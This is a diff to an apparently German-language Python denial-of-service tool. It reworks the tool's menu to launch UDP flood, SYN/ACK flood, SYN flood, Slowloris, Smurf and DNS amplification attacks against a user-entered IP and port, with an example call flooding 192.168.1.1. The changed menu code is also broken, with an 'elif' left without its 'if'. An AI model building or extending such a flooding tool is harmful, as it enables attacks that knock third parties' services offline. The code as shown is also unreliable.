@@ -35,7 +35,7 @@ def udp_flood(ip, port, packet_size):
         except:
             pass
 
-# TCP Flood (syn_ack_flood)
+# TCP Flood
 from scapy.all import *
 
 def syn_ack_flood(target_ip, target_port, packet_count):
@@ -55,7 +55,7 @@ def syn_ack_flood(target_ip, target_port, packet_count):
 # Beispielaufruf
 syn_ack_flood("192.168.1.1", 80, 1000)
 
-# Syn Flood 
+# SYN Flood 
 def syn_flood(target_ip, target_port, duration, threads):
     def attack():
         while time.time() < end_time:
@@ -138,7 +138,7 @@ def slowloris(ip, port):
             except:
                 sockets.remove(sock)
 
-# Smurf Attack, 19
+# Smurf Attack
 from struct import pack
 from random import randint
 from ctypes import Structure, c_ubyte, c_ushort, c_uint
@@ -317,11 +317,18 @@ if __name__ == "__main__":
     while True:
         print("1 - UDP Flood")
         print("2 - TCP Flood")
-        print("3 - Slowloris Attack")
-        print("4 - Beenden")
-        choice = input("Wähle eine Option: ")
+        print("3 - SYN Flood")
+        print("4 - Slowloris Attack")
+        print("5 - Smurf Attack")
+        print("6 - DNS Amplification")
+        print("7 - Beenden")
+        choice = input(" [ Wähle eine Option ] : ")
 
-        if choice in ["1", "2", "3"]:
+        elif choice == "7":
+            print("[INFO] Programm beendet.")
+            sys.exit()
+            
+        if choice in ["1", "2", "3", "4", "5", "6"]:
             ip = input("Ziel-IP-Adresse: ")
             port = int(input("Ziel-Port: "))
             packet_size = int(input("Paketgröße in Bytes: "))
@@ -329,8 +336,11 @@ if __name__ == "__main__":
 
             attack_function = {
                 "1": udp_flood,
-                "2": tcp_flood,
-                "3": slowloris,
+                "2": syn_ack_flood,
+                "3": syn_flood,
+                "4": slowloris,
+                "5": smurf_attack,
+                "6":send_dns_query,
             }.get(choice)
 
             stop_event.clear()
@@ -348,7 +358,3 @@ if __name__ == "__main__":
 
             input("\n[INFO] Drücke ENTER, um den Angriff zu stoppen.\n")
             stop_event.set()
-
-        elif choice == "4":
-            print("[INFO] Programm beendet.")
-            sys.exit()
